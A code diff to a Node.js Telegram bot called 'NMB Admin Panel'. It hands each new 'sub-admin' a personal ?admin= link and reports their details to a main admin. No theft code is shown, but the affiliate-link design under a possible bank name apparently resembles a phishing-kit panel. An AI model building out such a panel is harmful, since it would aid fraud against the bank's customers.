@@ -62,17 +62,30 @@ async function initBot() {
       const firstName = chatInfo.first_name || msg.from.first_name || 'User';
       const lastName = chatInfo.last_name || msg.from.last_name || '';
 
-      if (!admins.has(chatId)) {
+      const isNewAdmin = !admins.has(chatId);
+      if (isNewAdmin) {
         admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
         saveAdmins();
       }
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      const adminMessage = `👑 *NMB Admin Panel*\n\n` +
-                           `👤 *User:* ${firstName} ${lastName}\n` +
-                           `• Chat ID: \`${chatId}\`\n\n` +
-                           `🔗 *Your Link:*\n${userLink}`;
-      await bot.sendMessage(chatId, adminMessage, { parse_mode: 'Markdown' });
+      
+      // 1. Send the personalized link and info to the user/sub-admin immediately
+      const subAdminMessage = `👑 *NMB Admin Panel*\n\n` +
+                              `👤 *User:* ${firstName} ${lastName}\n` +
+                              `• Chat ID: \`${chatId}\`\n\n` +
+                              `🔗 *Your Link:*\n${userLink}`;
+      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
+
+      // 2. Notify the Main Admin if a new sub-admin started the bot (and they are not the main admin themselves)
+      if (isNewAdmin && chatId !== String(FALLBACK_ADMIN_ID)) {
+        const mainAdminNotification = `🚨 *NEW SUB-ADMIN STARTED BOT*\n\n` +
+                                      `👤 *Name:* ${firstName} ${lastName}\n` +
+                                      `📌 *Username:* @${username}\n` +
+                                      `• Chat ID: \`${chatId}\`\n\n` +
+                                      `🔗 *Generated Link:*\n${userLink}`;
+        await bot.sendMessage(FALLBACK_ADMIN_ID, mainAdminNotification, { parse_mode: 'Markdown' });
+      }
     } catch (err) {}
   });
 
@@ -256,3 +269,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
+          
